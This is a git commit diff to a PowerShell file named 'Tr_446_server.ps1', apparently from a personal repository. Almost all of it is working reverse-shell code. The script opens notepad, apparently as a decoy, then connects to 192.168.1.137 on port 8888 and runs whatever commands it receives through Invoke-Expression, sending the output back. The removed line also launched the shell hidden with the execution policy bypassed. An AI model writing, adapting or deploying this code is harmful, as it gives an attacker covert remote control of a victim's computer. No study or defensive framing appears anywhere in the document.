4fd78d8abc3dc2d7203995cd36ec4b46a9793a53
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2024-01-28 12:31:26 +0600

    Update Tr_446_server.ps1

--- Tr_446_server.ps1
+++ Tr_446_server.ps1
@@ -1,3 +1,3 @@
 @echo off
 notepad
-powershell -NoProfile -W Hidden -ExecutionPolicy Bypass -Command "$tcp = New-Object Net.Sockets.TCPClient('192.168.1.137', 8888);$s=$tcp.GetStream();$w=New-Object IO.StreamWriter($s);function W($s){$w.Write($s+'SHELL>');$w.Flush()}W'';while($tcp.Connected){$b=New-Object byte[] $tcp.ReceiveBufferSize;$r=$s.Read($b,0,$tcp.ReceiveBufferSize);if($r -gt 0){$c=([text.encoding]::UTF8).GetString($b,0,$r-1);$o=try{Invoke-Expression $c 2>&1|Out-String}catch{$_|Out-String}W($o)}else{break}}$w.Close()"
+$tcp = New-Object Net.Sockets.TCPClient('192.168.1.137', 8888);$s=$tcp.GetStream();$w=New-Object IO.StreamWriter($s);function W($s){$w.Write($s+'SHELL>');$w.Flush()}W'';while($tcp.Connected){$b=New-Object byte[] $tcp.ReceiveBufferSize;$r=$s.Read($b,0,$tcp.ReceiveBufferSize);if($r -gt 0){$c=([text.encoding]::UTF8).GetString($b,0,$r-1);$o=try{Invoke-Expression $c 2>&1|Out-String}catch{$_|Out-String}W($o)}else{break}}$w.Close()
